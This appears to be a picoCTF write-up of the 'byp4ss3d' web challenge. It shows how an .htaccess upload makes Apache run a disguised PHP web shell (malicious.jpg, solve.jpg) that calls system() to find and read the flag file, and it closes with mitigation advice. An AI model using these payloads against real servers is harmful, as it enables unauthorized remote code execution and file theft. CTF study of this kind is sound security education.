@@ -1,0 +1,149 @@
+📌 picoCTF – byp4ss3d Writeup
+
+Author: Yahaya Meddy
+Category: Web Exploitation
+Difficulty: Easy–Medium
+Vulnerability Type: Insecure File Upload → Apache Handler Abuse → Remote Code Execution
+
+🧾 Challenge Description
+
+A university's online registration portal asks students to upload their ID cards for verification.
+The developer put some filters in place to ensure only image files are uploaded — but are they enough?
+Take a look at how the upload is implemented. Maybe there's a way to slip past the checks and interact with the server in ways you shouldn't.
+
+🎯 Objective
+
+Bypass the image upload restrictions and gain unintended interaction with the server — ultimately retrieving the flag.
+
+🧠 Threat Model & Vulnerability Analysis
+
+The application:
+
+Accepts only .jpg image uploads
+
+Implements basic extension filtering
+
+Does not restrict .htaccess uploads
+
+Runs on Apache
+
+⚠️ Critical issue:
+If .htaccess files are allowed inside the upload directory, an attacker can override Apache behavior and change how file types are handled.
+
+This opens the door for executing arbitrary PHP code disguised as images.
+
+🛠️ Exploitation Process
+1️⃣ Initial Recon – Finding the Flag Location
+
+Create a file named:
+
+malicious.jpg
+
+
+Insert:
+
+<?php echo system("find / -name flag* 2>/dev/null"); ?>
+
+
+This searches the entire filesystem for files starting with flag.
+
+2️⃣ Bypassing Image Restriction via .htaccess
+
+Create:
+
+.htaccess
+
+
+With:
+
+<Files "malicious.jpg">
+AddHandler application/x-httpd-php .jpg
+</Files>
+
+
+🔎 What this does:
+
+Forces Apache to interpret malicious.jpg as PHP
+
+Overrides default file handling inside the directory
+
+Upload both files.
+
+3️⃣ Achieving Code Execution
+
+Visit:
+
+http://target/uploads/malicious.jpg
+
+
+The server executes the PHP code.
+
+Output reveals:
+
+/var/www/flag.txt
+
+
+Now we know the exact flag location.
+
+4️⃣ Reading the Flag
+
+Create a new file:
+
+solve.jpg
+
+
+Insert:
+
+<?php echo system("cat /var/www/flag.txt"); ?>
+
+
+Update .htaccess:
+
+<Files "solve.jpg">
+AddHandler application/x-httpd-php .jpg
+</Files>
+
+
+Re-upload .htaccess.
+
+5️⃣ Final Step
+
+Visit:
+
+http://target/uploads/solve.jpg
+
+
+🎉 The flag is displayed.
+
+🧩 Why This Worked
+
+The developer relied only on file extension filtering, but:
+
+Apache allows per-directory configuration via .htaccess
+
+Upload directory allowed execution
+
+No content-type validation was enforced
+
+No execution restrictions were set
+
+This allowed us to convert a harmless image upload into Remote Code Execution.
+
+🔐 Proper Mitigation
+
+To prevent this vulnerability:
+
+Disable .htaccess in upload directories (AllowOverride None)
+
+Store uploads outside web root
+
+Validate file MIME types server-side
+
+Strip executable permissions from upload directories
+
+🏁 Conclusion
+
+This challenge demonstrates how:
+
+File upload + weak validation + misconfigured Apache
+= Full Remote Code Execution
